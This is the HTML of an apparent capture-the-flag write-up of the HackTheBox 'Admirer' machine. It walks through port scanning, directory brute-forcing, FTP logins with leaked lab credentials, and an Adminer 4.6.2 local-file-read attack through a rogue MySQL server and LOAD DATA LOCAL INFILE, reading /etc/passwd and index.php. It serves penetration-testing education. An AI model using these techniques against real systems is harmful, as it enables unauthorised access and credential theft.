@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Admirer just retired on Hackthebox, it’s an easy difficulty Linux machine with a user difficulty rating of 5.2&#x2F;10. While rated easy I wouldn’t recommended it for beginners since it’s easy to miss im">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Admirer">
+<meta property="og:url" content="https://hg8.sh/posts/admirer/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="Admirer just retired on Hackthebox, it’s an easy difficulty Linux machine with a user difficulty rating of 5.2&#x2F;10. While rated easy I wouldn’t recommended it for beginners since it’s easy to miss im">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82153714-7fb86380-9869-11ea-90dd-c0d45e1273c9.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81843064-5c31a800-954d-11ea-81b2-2ef495a2ba59.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81853902-678ccf80-955d-11ea-90d6-34783dac7b08.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81856836-a3299880-9561-11ea-8f63-c772d16105a8.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81856158-ae2ff900-9560-11ea-8721-88e45230f17e.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/81856613-5940b280-9561-11ea-955e-c70ad2cb51fd.png">
+<meta property="article:published_time" content="2020-09-25T22:00:00.000Z">
+<meta property="article:modified_time" content="2020-09-30T09:05:58.458Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="admirer">
+<meta property="article:tag" content="enumeration">
+<meta property="article:tag" content="adminer">
+<meta property="article:tag" content="ftp">
+<meta property="article:tag" content="python library overwrite">
+<meta property="article:tag" content="mysql local file read">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82153714-7fb86380-9869-11ea-90dd-c0d45e1273c9.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>HackTheBox - Admirer :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/posts/travel/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credentials-txt"><span class="toc-number">1.2.</span> <span class="toc-text">Credentials.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Admirer-app-backup"><span class="toc-number">1.3.</span> <span class="toc-text">Admirer app backup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adminer-Database-management-tool"><span class="toc-number">1.4.</span> <span class="toc-text">Adminer Database management tool.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-Local-file-read-gt-waldo"><span class="toc-number">1.5.</span> <span class="toc-text">MySQL Local file read -&gt; waldo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hijacking-Python-shutil-module"><span class="toc-number">2.2.</span> <span class="toc-text">Hijacking Python shutil module</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - Admirer
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-25T22:00:00.000Z" itemprop="datePublished">26-09-2020</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      12 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img width="584" alt="admirer-hackthebox" src="https://user-images.githubusercontent.com/9076747/82153714-7fb86380-9869-11ea-90dd-c0d45e1273c9.png">
+
+<p>Admirer just retired on Hackthebox, it’s an easy difficulty Linux machine with a user difficulty rating of 5.2/10. While rated easy I wouldn’t recommended it for beginners since it’s easy to miss important information and get stuck at soon as foothold. While doing the box I found it a bit frustrating to gather all the pieces of the puzzle together properly. But once done and looking back the box feel very well designed and quite straightforward even though the few rabbits holes. </p>
+<p><strong>Tl;Dr:</strong> To get the user flag you had to find an instance of <code>Adminer</code> Database, and, after a lot of enumeration to find credentials to get into an FTP server and grab a backup of the web app. Then you connect to AdminerDB using your own MySQL server and from there you can exploit a vulnerability allowing to read local files using SQL. This way you retrieve <code>waldo</code> user MySQL credentials, and those credentials are working on SSH allowing us to retrieve the flag.<br>The root flag is accessible after overwriting the python library <code>shutils</code> using <code>PYTHONPATH</code> environnement variable to make privilege escalation from a python script running as root. </p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<p>First thing first, let’s add the box IP to the hosts file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.187 admirer.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>and let’s start!</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC admirer.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 21:36 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> admirer.htb (10.10.10.187)</span><br><span class="line">Host is up (0.092s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/admin-dir</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Admirer</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>We have a classical web app running on port 80, the FTP port 21 and the SSH port 22 open.</p>
+<p>Opening <a href="http://admirer.htb" target="_blank" rel="noopener">http://admirer.htb</a> display a following page:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81843064-5c31a800-954d-11ea-81b2-2ef495a2ba59.png" alt="admirer homepage"></p>
+<p>We don’t have a lot of informations on the homepage, however <code>nmap</code> returned a interesting entry from <code>robots.txt</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/admin-dir</span><br></pre></td></tr></table></figure>
+
+<p>Heading to <code>http://admirer.htb/admin-dir</code> return a <code>403 Forbidden</code> so let’s try to use <code>gobuster</code> with common file extension to find interesting files:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">"http://admirer.htb/admin-dir/"</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php,txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/contacts.txt (Status: 200)</span><br><span class="line">/credentials.txt (Status: 200)</span><br></pre></td></tr></table></figure>
+
+<p>We get two interesting text files.</p>
+<h3 id="Credentials-txt"><a href="#Credentials-txt" class="headerlink" title="Credentials.txt"></a>Credentials.txt</h3><p> <code>credentials.txt</code> looks particularly promising. Let’s see what we have inside:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://admirer.htb/admin-dir/credentials.txt</span><br><span class="line">[Internal mail account]</span><br><span class="line">w.cooper@admirer.htb</span><br><span class="line">fgJr6q<span class="comment">#S\W:$P</span></span><br><span class="line"></span><br><span class="line">[FTP account]</span><br><span class="line">ftpuser</span><br><span class="line">%n?4Wz&#125;R<span class="variable">$tTF7</span></span><br><span class="line"></span><br><span class="line">[Wordpress account]</span><br><span class="line">admin</span><br><span class="line">w0rdpr3ss01!</span><br></pre></td></tr></table></figure>
+
+<p>Well that’s surprisingly a lot of credentials… Let’s start with the beginning, we have seen FTP server open on <code>nmap</code>, let’s try to login using the credentials we just found: <code>ftpuser</code>:<code>%n?4Wz}R$tTF7</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ftp admirer.htb</span><br><span class="line">Connected to admirer.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (admirer.htb:hg8): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            3405 Dec 02 21:24 dump.sql</span><br><span class="line">-rw-r--r--    1 0        0         5270987 Dec 03 21:20 html.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>The FTP server looks looks like a backup folder, since we can see it contains a SQL database dump (<code>dump.sql</code>) and an archive of what seems to be the website source code (in <code>html.tar.gz</code>).</p>
+<p>Let’s download both files to investigate:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get dump.sql</span><br><span class="line">ftp&gt; get html.tar.gz</span><br><span class="line">ftp&gt; quit</span><br></pre></td></tr></table></figure>
+
+<h3 id="Admirer-app-backup"><a href="#Admirer-app-backup" class="headerlink" title="Admirer app backup"></a>Admirer app backup</h3><p>The <code>dump.sql</code> doesn’t contains any useful informations so let’s directly skip to the <code>html.tar.gz</code> archive:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ tar -xf html.tar.gz</span><br><span class="line">[hg8@archbook ~]$ ls -l</span><br><span class="line">total 7188</span><br><span class="line">drwxr-x--- 6 hg8 hg8    4096 Jun  6  2019 assets</span><br><span class="line">drwxr-x--- 4 hg8 hg8    4096 Dec  2 21:29 images</span><br><span class="line">-rw-r----- 1 hg8 hg8    4613 Dec  3 21:20 index.php</span><br><span class="line">-rw-r----- 1 hg8 hg8     134 Dec  1 22:31 robots.txt</span><br><span class="line">drwxr-x--- 2 hg8 hg8    4096 May  9 13:41 utility-scripts</span><br><span class="line">drwxr-x--- 2 hg8 hg8    4096 Dec  2 18:25 w4ld0s_s3cr3t_d1r</span><br></pre></td></tr></table></figure>
+
+<p><code>w4ld0s_s3cr3t_d1r</code> seems to be the previous name of the <code>/admin-dir</code> we found earlier. The <code>robots.txt</code> file extracted from the archive confirms the theory:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line"></span><br><span class="line"><span class="comment"># This folder contains personal stuff, so no one (not even robots!) should see it - waldo</span></span><br><span class="line">Disallow: /w4ld0s_s3cr3t_d1r</span><br></pre></td></tr></table></figure>
+
+<p>Another folder catch the attention: <code>utility-scripts</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ls -l utility-scripts/</span><br><span class="line">total 16</span><br><span class="line">-rw-r----- 1 hg8 hg8 1795 Dec  2 18:48 admin_tasks.php</span><br><span class="line">-rw-r----- 1 hg8 hg8  401 Dec  1 23:28 db_admin.php</span><br><span class="line">-rw-r----- 1 hg8 hg8   20 Nov 29 20:32 info.php</span><br><span class="line">-rw-r----- 1 hg8 hg8   53 Dec  2 18:40 phptest.php</span><br></pre></td></tr></table></figure>
+
+<p><code>db_admin.php</code> contains database credentials, let’s note them for later:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// utility-scripts/db_admin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $servername = <span class="string">"localhost"</span>;</span><br><span class="line">  $username = <span class="string">"waldo"</span>;</span><br><span class="line">  $password = <span class="string">"Wh3r3_1s_w4ld0?"</span>;</span><br><span class="line">[...]</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Something odd is that the main <code>index.php</code> found in the archive contains different database credentials (<em>which should throw error since the password contains unescaped password</em>):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// index.php</span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$servername</span> = <span class="string">"localhost"</span>;</span><br><span class="line">  <span class="variable">$username</span> = <span class="string">"waldo"</span>;</span><br><span class="line">  <span class="variable">$password</span> = <span class="string">"]F7jLHw:*G&gt;UPrTo&#125;~A"</span>d6b<span class="string">";</span></span><br><span class="line"><span class="string">  <span class="variable">$dbname</span> = "</span>admirerdb<span class="string">";</span></span><br><span class="line"><span class="string">[...]</span></span><br></pre></td></tr></table></figure>
+
+<p>Out of curiosity I tried both of these password on <code>waldo</code> ssh account but none worked. </p>
+<p>Let’s go back to our <code>utility-scripts</code> folder. <code>admin_tasks.php</code> contains an interesting app:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Web Interface to the admin_tasks script</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'task'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $task = $_REQUEST[<span class="string">'task'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($task == <span class="string">'1'</span> || $task == <span class="string">'2'</span> || $task == <span class="string">'3'</span> || $task == <span class="string">'4'</span> || $task == <span class="string">'5'</span> || $task == <span class="string">'6'</span> || $task == <span class="string">'7'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/***********************************************************************************</span></span><br><span class="line"><span class="comment">        Available options:</span></span><br><span class="line"><span class="comment">        1) View system uptime</span></span><br><span class="line"><span class="comment">        2) View logged in users</span></span><br><span class="line"><span class="comment">        3) View crontab (current user only)</span></span><br><span class="line"><span class="comment">        4) Backup passwd file (not working)</span></span><br><span class="line"><span class="comment">        5) Backup shadow file (not working)</span></span><br><span class="line"><span class="comment">        6) Backup web data (not working)</span></span><br><span class="line"><span class="comment">        7) Backup database (not working)</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">        <span class="doctag">NOTE:</span> Options 4-7 are currently NOT working because they need root privileges.</span></span><br><span class="line"><span class="comment">        I'm leaving them in the valid tasks in case I figure out a way</span></span><br><span class="line"><span class="comment">        to securely run code as root from a PHP page.</span></span><br><span class="line"><span class="comment">        ************************************************************************************/</span></span><br><span class="line">        <span class="keyword">echo</span> str_replace(<span class="string">"\n"</span>, <span class="string">"&lt;br /&gt;"</span>, shell_exec(<span class="string">"/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"Invalid task."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>If we could bypass this <code>if</code> condition we could achieve remote code execution… Unfortunately even if using weak comparaison (<code>==</code>) I couldn’t find a <a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf" target="_blank" rel="noopener">Type Juggling</a> kind of exploit nor find any other way to bypass the check and achieve remote code execution from there. </p>
+<p>Well since we don’t have other entry point so far let’s enumerate a bit more. We know that this archive is old since some folder were renamed and some files are not available anymore on the web server. Maybe new files have been added ? Let’s run <code>gobuster</code> to the only folder we didn’t check yet: <code>utility-scripts</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">"http://admirer.htb/utility-scripts"</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/adminer.php (Status: 200)</span><br><span class="line">/info.php (Status: 200)</span><br><span class="line">/phptest.php (Status: 200)</span><br></pre></td></tr></table></figure>
+
+<p>We got a new one in reference to the box name: <code>adminer.php</code></p>
+<h3 id="Adminer-Database-management-tool"><a href="#Adminer-Database-management-tool" class="headerlink" title="Adminer Database management tool."></a>Adminer Database management tool.</h3><blockquote>
+<p>Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB.</p>
+<p><a href="https://www.adminer.org/" target="_blank" rel="noopener">https://www.adminer.org/</a></p>
+</blockquote>
+<p>Sounds good we have access to a database management tool. Unfortunately none of the credentials we founds seems to work:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81853902-678ccf80-955d-11ea-90d6-34783dac7b08.png" alt="admirer adminer homepage"></p>
+<p>Yet we notice something useful on the page, the version used is <code>4.6.2</code> while the latest version is <code>4.7.7</code>. Searching about this version on Google returns an interesting result: </p>
+<blockquote>
+<p><strong>Adminer 4.6.2 File Disclosure Vulnerability</strong></p>
+<p>Adminer is a popular PHP tool to administer MySQL and PostgreSQL databases. However, it can be lured to disclose arbitrary files. Attackers can abuse that to fetch passwords for popular apps such as Magento and Wordpress, and gain control of a site’s database.</p>
+<p>Exploitation happens in three stages. First, the attacker needs a modified MySQL server, which is altered to send out data import requests to any client that connects.</p>
+<p>Second, the attacker can instruct the victim Adminer to connect to his rigged MySQL server (external connections are actually a feature of Adminer).</p>
+<p>Third – With access to the database the attacker could read sensitive information, such as customer details.</p>
+<p><a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability" target="_blank" rel="noopener">https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability</a></p>
+</blockquote>
+<p>Sounds like a very interesting vulnerability, which actually goes back up to <a href="https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html" target="_blank" rel="noopener">2018 in a little different scenario</a>.</p>
+<p>Let’s give it a try.</p>
+<h3 id="MySQL-Local-file-read-gt-waldo"><a href="#MySQL-Local-file-read-gt-waldo" class="headerlink" title="MySQL Local file read -&gt; waldo"></a>MySQL Local file read -&gt; waldo</h3><p>Following the vulnerability writeup we need to first set our own MySQL instance. We have to make sure it allows external connections with something like:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'hg8'</span>@<span class="string">'10.10.10.187'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'&lt;password&gt;'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Then create a table that will hold our extracted data:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`test`</span> (</span><br><span class="line">  <span class="string">`txt`</span> <span class="built_in">varchar</span>(<span class="number">800</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=latin1;</span><br></pre></td></tr></table></figure>
+
+<p>Once our MySQL is all set and running let’s connect to it using <code>http://admirer.htb/utility-scripts/adminer.php</code>:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81856836-a3299880-9561-11ea-8f63-c772d16105a8.png" alt="admirer adminer MySQL connect"></p>
+<p>Alright we are in and we can execute SQL queries. Let’s see if we can abuse the SQL query <code>LOAD DATA LOCAL INFILE</code> to retrieve servers data. Let’s start with the classical <code>/etc/passwd</code>:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> <span class="keyword">LOCAL</span> <span class="keyword">INFILE</span> <span class="string">'/etc/passwd'</span> </span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> test.test</span><br><span class="line"><span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">"\n"</span></span><br></pre></td></tr></table></figure>
+
+<p>Unfortunately we get blocked by PHP restrictions:</p>
+<blockquote>
+<p>Error in query (2000): open_basedir restriction in effect. Unable to open file</p>
+</blockquote>
+<p>Then maybe we can try on files in the webroot directory ? Let’s check for the <code>index.php</code> since we know the file contains credentials, maybe we could find up-to-date passwords:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81856158-ae2ff900-9560-11ea-8721-88e45230f17e.png" alt="admirer adminer local file disclosure"></p>
+<p><code>123 rows affected</code>, that looks good! We should now find the file content in the <code>test</code> table:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/81856613-5940b280-9561-11ea-955e-c70ad2cb51fd.png" alt="admirer adminer local file disclosure"></p>
+<p>Bingo! We got new credentials, let’s try them on <code>waldo</code> SSH account:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh waldo@admirer.htb</span><br><span class="line">waldo@admirer.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Sat May  9 14:13:42 2020 from 10.10.10.10</span></span><br><span class="line"><span class="string">waldo@admirer:~$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">waldo@admirer:~$ cat user.txt</span></span><br><span class="line"><span class="string">dxxxxxxxxxxxxxxxxxxxx6</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>During the usual recon, an interesting <code>sudo</code> config catch the eye:</p>
